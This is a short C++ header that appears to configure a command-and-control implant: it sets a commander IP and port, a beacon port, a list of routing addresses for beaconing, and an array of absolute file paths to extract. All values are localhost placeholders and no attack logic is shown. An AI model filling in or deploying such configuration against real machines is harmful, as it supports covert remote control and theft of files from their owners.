#pragma once

#include <array>

/* YOUR IP */
#define COMMANDER_IP "127.0.0.1"
/* YOUR PORT */
#define COMMANDER_PORT 8081

/* Port on which the process will listen as a beacon */
#define BEACON_PORT 8082

/* List all the IP adress to test to try to establish a connection via beaconing */
std::array<const char*, 2> routing({"127.0.0.1", "127.0.0.1"});

/* define the number of client allowed to connected to a beacon */
#define MAX_CONNECTION 5

/* File to extract */
/* Beware this must be absolute path */
std::array<const char*, 1> file_to_extract({});